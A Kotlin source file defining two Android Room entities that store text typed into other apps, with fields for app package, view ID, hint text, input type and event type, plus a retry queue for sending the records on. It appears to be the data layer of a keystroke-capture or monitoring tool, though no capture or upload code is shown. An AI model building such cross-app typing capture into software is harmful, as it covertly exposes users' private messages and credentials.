package com.notifyhub.data

import androidx.room.Entity
import androidx.room.Index
import androidx.room.PrimaryKey

@Entity(tableName = "pending_typed_text")
data class PendingTypedText(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val deviceId: String,
    val packageName: String,
    val appLabel: String,
    val targetName: String = "",
    val text: String,
    val capturedAt: String,
    val rawPackage: String = packageName,
    val rawAppLabel: String = appLabel,
    val resolvedPackage: String? = null,
    val resolvedAppLabel: String? = null,
    val attributionSource: String? = null,
    val attributionConfidence: Double = 0.0,
    val targetSource: String? = null,
    val className: String? = null,
    val viewId: String? = null,
    val hintText: String? = null,
    val contentDescription: String? = null,
    val inputType: Int? = null,
    val eventType: Int? = null,
    val attempts: Int = 0,
    val nextAttemptAt: Long = 0,
    val createdAt: Long = System.currentTimeMillis()
)

@Entity(
    tableName = "typed_text_drafts",
    indices = [Index(value = ["sessionKey"], unique = true)]
)
data class TypedTextDraft(
    @PrimaryKey(autoGenerate = true) val id: Long = 0,
    val sessionKey: String,
    val deviceId: String,
    val packageName: String,
    val appLabel: String,
    val text: String,
    val targetName: String,
    val className: String? = null,
    val viewId: String? = null,
    val hintText: String? = null,
    val contentDescription: String? = null,
    val inputType: Int? = null,
    val eventType: Int? = null,
    val firstSeenAt: Long = System.currentTimeMillis(),
    val updatedAt: Long = System.currentTimeMillis()
)
